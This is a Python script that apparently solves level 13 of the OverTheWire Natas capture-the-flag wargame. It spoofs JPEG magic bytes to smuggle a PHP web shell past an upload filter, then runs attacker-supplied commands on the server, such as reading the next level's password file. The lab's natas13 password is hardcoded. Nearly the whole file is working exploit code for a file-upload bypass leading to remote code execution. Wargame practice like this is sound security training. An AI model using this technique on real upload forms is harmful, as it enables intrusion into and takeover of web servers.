import re, requests, sys
USER = 'natas13'
PASS = 'trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC'
URL = f'http://{USER}.natas.labs.overthewire.org/index.php'
url = f'http://{USER}.natas.labs.overthewire.org/'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
burp = {"http": "http://127.0.0.1:8080"}

if len(sys.argv) <= 1:
    print("""type a command for rce in natas12
example: python3 natas13.py 'cat /etc/natas_webpass/natas14'""")
    sys.exit(1)

magic_bytes = b'\xFF\xD8\xFF'
php_content = b'<?php system($_GET["cmd"])?>'
file_payload = magic_bytes + php_content

file = {
    'MAX_FILE_SIZE': (None, '1000'),
    'filename': (None, 'natas12.php'),
    'uploadedfile': ('natas12.jpg', file_payload, 'image/jpeg')
} 

def webshell():
    request = requests.post(url=URL, auth=auth_basic, files=file)
    response_http = request.text
    uploadedfile = re.search(r'upload/[^"]+\.php', response_http)
    path = url + uploadedfile.group() + f'?cmd={requests.utils.quote(sys.argv[1])}'
    return path

def rce():
    request = requests.get(url=webshell(), auth=auth_basic)
    response_http = request.text
    print('\n(natas13@natas13)\n:', response_http)

rce()